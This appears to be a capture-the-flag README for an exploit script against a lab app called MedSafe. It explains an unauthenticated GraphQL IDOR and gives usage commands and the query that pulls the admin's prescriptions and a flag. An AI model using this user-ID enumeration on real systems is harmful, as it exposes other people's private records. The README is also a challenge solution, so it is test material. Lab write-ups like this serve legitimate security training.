# EXP for X-007-24 MedSafe

This exploit queries the exposed GraphQL endpoint to retrieve the admin’s prescriptions and extracts the flag from the 43rd record (IDOR via `getPrescriptions(userId: ...)`).

## Usage

- Default auto-targeting:
  - `python3 exp.py`
  - It tries, in order: `$TARGET_URL` env (if set) → `http://ip5003/graphql` → `http://localhost:5003/graphql`.

- Specify a different endpoint (override auto):
  - `python3 exp.py --url http://127.0.0.1:5003/graphql`
  - `python3 exp.py --url http://ip5003/graphql`

- Query a specific userId (default brute-forces 1..10):
  - `python3 exp.py --user-id 1`
  - `python3 exp.py --max 20`

The script prints the flag to stdout if found; otherwise exits non‑zero with an error on stderr.

## How It Works

- Vulnerability: Unauthenticated GraphQL + IDOR.
- Endpoint: `/graphql` accepts `getPrescriptions(userId: ...)` without checking the current user.
- Flag: Injected into the admin’s 43rd prescription at build time and returned by GraphQL when requesting `userId` of the admin (often `1`).

GraphQL query used:

```
query {
  getPrescriptions(userId: 1) {
    id
    userId
    prescriptionDetails
    flag
  }
}
```

## Notes

- If you see HTTP 405, you likely hit `/` instead of `/graphql`.
- The GraphQL field name is camelCase: `getPrescriptions` and `userId`.
- Remote example: `python3 exp.py --url http://ip5003/graphql`
